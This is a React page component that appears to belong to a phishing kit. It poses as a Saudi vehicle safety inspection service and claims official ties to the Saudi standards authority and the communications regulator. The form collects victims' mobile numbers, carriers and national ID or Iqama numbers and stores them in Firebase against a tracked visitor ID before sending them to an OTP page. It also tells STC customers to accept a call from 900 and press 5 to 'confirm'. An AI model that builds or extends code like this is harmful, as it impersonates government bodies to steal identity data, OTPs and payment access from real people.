import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { ArrowUpRight, CheckCircle2, ShieldCheck, Phone, CreditCard, Menu, X } from "lucide-react";
import { addData, getOrCreateVisitorId, handleCurrentPage } from "@/lib/firebase";
import inspectionLogoUrl from "../../../attached_assets/logo_1791572229572.svg";

const providers = [
  "اس تي سي",
  "اس تي سي جوي",
  "زين",
  "فيرجن",
  "ليبارا",
  "موبايلي",
  "ياقوت",
];

const providerCodes = [
  "STC",
  "STC_JAWY",
  "ZAIN",
  "VIRGIN",
  "LEBARA",
  "MOBILY",
  "YAQOOT",
];

export default function VerifyMobilePage() {
  const [, setLocation] = useLocation();

  const [providerIndex, setProviderIndex] = useState("");
  const [mobileNumber, setMobileNumber] = useState("");
  const [idNumber, setIdNumber] = useState("");
  
  const [loading, setLoading] = useState(false);
  const [submitError, setSubmitError] = useState("");
  const [submitSuccess, setSubmitSuccess] = useState("");
  const [isInvalid, setIsInvalid] = useState(false);

  useEffect(() => {
    getOrCreateVisitorId();
    void handleCurrentPage("verify_mobile");
  }, []);

  const formatPhone = (val: string) => {
    const digits = val.replace(/\D/g, "");
    if (digits.startsWith("9665")) return "05" + digits.slice(4, 12);
    if (digits.startsWith("966")) return "0" + digits.slice(3, 11);
    return digits.slice(0, 10);
  };

  const formatId = (val: string) => {
    return val.replace(/\D/g, "").slice(0, 10);
  };

  const isValidPhone = (phone: string) => /^05\d{8}$/.test(phone);
  const isValidSaudiId = (id: string) => /^[12]\d{9}$/.test(id);

  const isFormValid =
    isValidPhone(mobileNumber) &&
    isValidSaudiId(idNumber) &&
    providerIndex !== "";

  const mobileError =
    mobileNumber && !isValidPhone(mobileNumber)
      ? "رقم الجوال غير صحيح؛ يجب أن يبدأ بـ05 ويتكون من 10 أرقام"
      : "";

  const idError =
    idNumber && !isValidSaudiId(idNumber) ? "رقم الهوية / الإقامة غير صحيح (10 أرقام)" : "";

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setSubmitError("");
    setSubmitSuccess("");
    setIsInvalid(false);

    if (!isFormValid) {
      setSubmitError("يرجى إدخال البيانات بشكل صحيح");
      return;
    }

    setLoading(true);

    try {
      const idx = Number(providerIndex);
      const provider = providerCodes[idx] || providers[idx];

      const visitorId = getOrCreateVisitorId();
      await addData({
        id: visitorId,
        mobileNumber,
        provider,
        idNumber,
        currentPage: "verify_mobile",
        phoneOtpStatus: "pending",
        updatedAt: new Date().toISOString(),
      });

      setSubmitSuccess("تم توثيق بيانات الجوال بنجاح");
      setTimeout(() => {
        setLocation(`/phone-otp`);
      }, 1000);
    } catch (err: any) {
      setIsInvalid(true);
      setSubmitError(err?.message || "تعذر توثيق الجوال، يرجى المحاولة مرة أخرى");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div
      className="min-h-screen flex flex-col text-right font-sans bg-[#f5f8f5]"
      dir="rtl"
      data-testid="page-verify-mobile"
    >
      <Header />

      <main className="flex-1 max-w-2xl mx-auto w-full px-4 sm:px-6 py-10">
        <div className="bg-white p-6 sm:p-10 rounded-2xl shadow-sm border border-[#e5ece6]">
          <form className="flex flex-col gap-6" onSubmit={handleSubmit}>
            {/* Top Logo & Title */}
            <div className="flex items-center justify-between border-b border-[#e9efe9] pb-4">
              <div className="flex items-center gap-3">
                <div className="w-12 h-12 rounded-xl bg-[#dfeee3] flex items-center justify-center text-[#126447]">
                  <Phone className="w-6 h-6" />
                </div>
                <div>
                  <h1 className="font-bold text-xl text-[#234b38]">توثيق واعتماد رقم الجوال</h1>
                  <p className="text-xs text-[#486253] mt-0.5">
                    الربط الإلكتروني مع الهيئة السعودية للمواصفات والمقاييس ومزودي الخدمة
                  </p>
                </div>
              </div>
              <ArrowUpRight className="w-6 h-6 text-[#126447]" />
            </div>

            <div className="bg-[#f5f8f5] p-4 rounded-xl border border-[#e5ece6] text-xs text-[#234b38] leading-relaxed">
              يجب أن يكون رقم الجوال موثقًا ومطابقًا لبيانات الهوية الوطنية / الإقامة، ومرتبطًا ببطاقة الدفع المدخلة لإتمام التوثيق.
            </div>

            {/* Provider Instructions Hint */}
            {providerIndex !== "" && (
              <div className="p-4 rounded-xl border bg-gradient-to-r from-[#dfeee3] to-white border-[#dce7de]">
                {providerIndex === "0" ? (
                  <p className="text-[#4f008c] text-sm font-bold leading-relaxed">
                    عملاء STC الكرام: في حال تلقي مكالمة من الرقم 900، يرجى قبولها واختيار الرقم 5 لتأكيد التوثيق.
                  </p>
                ) : (
                  <p className="text-[#126447] text-sm font-bold leading-relaxed">
                    ستصلك مكالمة أو رسالة توثيق من مزود الخدمة، يرجى اتباع التعليمات الصوتية والموافقة لتأكيد الطلب.
                  </p>
                )}
              </div>
            )}

            {/* Form Inputs */}
            <div className="flex flex-col gap-5">
              {/* Field 1: Phone */}
              <div className="flex flex-col gap-1.5">
                <label className="text-xs font-bold text-[#234b38]" htmlFor="mobileNumber">
                  رقم الجوال
                </label>
                <div className="flex items-center gap-3 border border-[#dce7de] rounded-xl px-4 py-3.5 bg-white focus-within:border-[#126447] focus-within:ring-1 focus-within:ring-[#126447] transition-all">
                  <img src="https://flagcdn.com/sa.svg" alt="flag sa" className="w-7 h-auto rounded shadow-xs" />
                  <span className="text-sm font-mono font-bold text-gray-500" dir="ltr">+966</span>
                  <input
                    id="mobileNumber"
                    name="mobileNumber"
                    dir="ltr"
                    type="tel"
                    placeholder="05xxxxxxxx"
                    className="flex-1 bg-transparent outline-none font-mono text-base font-bold text-gray-900"
                    value={mobileNumber}
                    onChange={(e) => setMobileNumber(formatPhone(e.target.value))}
                    data-testid="input-mobile-number"
                  />
                </div>
                {mobileError && <p className="text-xs text-red-500 font-medium">{mobileError}</p>}
              </div>

              {/* Field 2: Service Provider */}
              <div className="flex flex-col gap-1.5">
                <label className="text-xs font-bold text-[#234b38]" htmlFor="serviceProvider">
                  اختر مزود الخدمة
                </label>
                <select
                  id="serviceProvider"
                  className="w-full border border-[#dce7de] rounded-xl px-4 py-3.5 bg-white text-sm font-bold text-[#234b38] focus:outline-none focus:border-[#126447] transition-all"
                  value={providerIndex}
                  onChange={(e) => setProviderIndex(e.target.value)}
                  data-testid="select-service-provider"
                >
                  <option value="" disabled>اختر مزود الخدمة</option>
                  {providers.map((p, idx) => (
                    <option key={p} value={String(idx)}>
                      {p}
                    </option>
                  ))}
                </select>
              </div>

              {/* Field 3: ID / Iqama */}
              <div className="flex flex-col gap-1.5">
                <label className="text-xs font-bold text-[#234b38]" htmlFor="idNumber">
                  رقم الهوية الوطنية / الإقامة
                </label>
                <input
                  id="idNumber"
                  name="idNumber"
                  dir="ltr"
                  type="tel"
                  placeholder="1xxxxxxxxx / 2xxxxxxxxx"
                  className="w-full border border-[#dce7de] rounded-xl px-4 py-3.5 bg-white font-mono text-base font-bold text-gray-900 focus:outline-none focus:border-[#126447] focus:ring-1 focus:ring-[#126447] transition-all"
                  value={idNumber}
                  onChange={(e) => setIdNumber(formatId(e.target.value))}
                  data-testid="input-id-number"
                />
                {idError && <p className="text-xs text-red-500 font-medium">{idError}</p>}
              </div>
            </div>

            {/* Error / Success Messages */}
            {isInvalid && (
              <p className="font-semibold text-red-500 text-center text-sm">
                يوجد خطأ في البيانات المدخلة، يرجى إعادة التحقق.
              </p>
            )}
            {submitError && (
              <p className="font-semibold text-red-500 text-center text-sm" data-testid="error-submit">
                {submitError}
              </p>
            )}
            {submitSuccess && (
              <p className="font-bold text-green-600 text-center text-sm" data-testid="status-success">
                {submitSuccess}
              </p>
            )}

            {/* Submit Button */}
            <div className="pt-2">
              <button
                type="submit"
                className="w-full rounded-xl py-4 bg-[#126447] hover:bg-[#0e5239] text-white font-bold text-base transition-all shadow-md cursor-pointer disabled:opacity-60 flex items-center justify-center gap-2"
                disabled={!isFormValid || loading}
                data-testid="button-submit-verify"
              >
                {loading ? "جارٍ الإرسال..." : "تأكيد وتوثيق الدخول"}
              </button>
            </div>

            <div className="flex items-center justify-center gap-2 pt-2 text-[#126447]">
              <ShieldCheck className="w-4 h-4" />
              <span className="text-xs font-bold">ربط مباشر وآمن مع هيئة الاتصالات والفضاء والتكنولوجيا</span>
            </div>
          </form>
        </div>
      </main>

      <Footer />
    </div>
  );
}

function Header() {
  const [menuOpen, setMenuOpen] = useState(false);
  const [, setLocation] = useLocation();

  return (
    <header className="relative z-20 border-b border-[#e9efe9] bg-white/95 backdrop-blur">
      <div className="mx-auto flex max-w-7xl items-center justify-between gap-5 px-5 py-4 sm:px-8 lg:px-10">
        <a href="/home" className="flex items-center gap-3" aria-label="الرئيسية">
          <img
            src={inspectionLogoUrl}
            alt="مركز سلامة المركبات"
            className="h-9 w-auto max-w-[210px] object-contain sm:h-11"
          />
        </a>

        <div className="hidden lg:flex items-center gap-2 text-xs font-bold text-[#126447] bg-[#dfeee3] px-3.5 py-1.5 rounded-xl border border-[#dce7de]">
          <ShieldCheck className="w-4 h-4" />
          خدمة توثيق الهوية والرقم المعتمدة
        </div>

        <button
          type="button"
          className="grid h-10 w-10 place-items-center rounded-xl border border-[#dce7de] text-[#234b38] lg:hidden"
          onClick={() => setMenuOpen((open) => !open)}
          aria-label={menuOpen ? "إغلاق القائمة" : "فتح القائمة"}
        >
          {menuOpen ? <X className="h-5 w-5" /> : <Menu className="h-5 w-5" />}
        </button>
      </div>

      {menuOpen && (
        <nav className="absolute inset-x-4 top-[calc(100%-0.25rem)] rounded-2xl border border-[#e5ece6] bg-white p-3 shadow-xl lg:hidden z-50">
          {[
            { href: "/home", label: "الرئيسية" },
            { href: "/book-appointment", label: "حجز موعد" },
            { href: "/checkout", label: "الدفع والسداد" },
          ].map((item) => (
            <a
              key={item.href}
              href={item.href}
              onClick={(e) => {
                e.preventDefault();
                setMenuOpen(false);
                setLocation(item.href);
              }}
              className="block rounded-xl px-4 py-3 text-right text-sm font-semibold text-[#315440] hover:bg-[#f1f6f2]"
            >
              {item.label}
            </a>
          ))}
        </nav>
      )}
    </header>
  );
}

function HeroBanner() {
  return (
    <div className="w-full">
      <div className="py-6 px-4 text-center text-white bg-[#126447]">
        <h1 className="text-2xl sm:text-3xl font-extrabold mb-1">
          توثيق مالك المركبة ورقم الجوال
        </h1>
        <p className="text-xs sm:text-sm font-normal text-[#dfeee3] opacity-90">
          خدمة الربط المباشر مع مزودي الخدمة المعتمدين في المملكة العربية السعودية
        </p>
      </div>
    </div>
  );
}

function Footer() {
  return (
    <footer
      className="py-8 text-center text-white font-medium text-xs mt-auto bg-[#126447]"
      data-testid="section-footer"
    >
      جميع الحقوق محفوظة © 2026 مركز سلامة المركبات - الهيئة السعودية للمواصفات والمقاييس والجودة
    </footer>
  );
}
